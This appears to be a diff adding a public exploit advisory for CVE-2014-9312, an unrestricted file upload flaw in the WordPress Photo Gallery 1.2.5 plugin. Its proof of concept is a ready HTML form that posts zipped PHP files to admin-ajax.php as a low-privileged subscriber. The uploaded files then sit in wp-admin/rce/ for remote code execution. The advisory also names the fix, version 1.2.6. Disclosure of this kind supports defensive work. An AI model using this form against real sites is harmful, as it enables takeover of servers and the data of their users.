@@ -1,0 +1,34 @@
+# Exploit Title: Photo Gallery 1.2.5 Unrestricted File Upload
+# Date: 11-11-2014
+# Software Link: https://wordpress.org/plugins/photo-gallery/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# CVE: CVE-2014-9312
+# Category: webapps
+
+1. Description
+  
+Every registered user (even Subscriber) can access upload functionality because of read role used inside UploadHandler.php
+
+http://security.szurek.pl/photo-gallery-125-unrestricted-file-upload.html
+  
+2. Proof of Concept
+
+Login as regular user (created using wp-login.php?action=register).
+
+Pack .php files into .zip archive then send it using:
+
+<form method="post" action="http://wordpress-install/wp-admin/admin-ajax.php?action=bwg_UploadHandler&dir=rce/" enctype="multipart/form-data">
+    <input type="file" name="files">
+    <input type="submit" value="Hack!">
+</form>
+
+Your files will be visible inside:
+
+http://wordpress-install/wp-admin/rce/
+  
+3. Solution:
+  
+Update to version 1.2.6
+https://downloads.wordpress.org/plugin/photo-gallery.1.2.6.zip
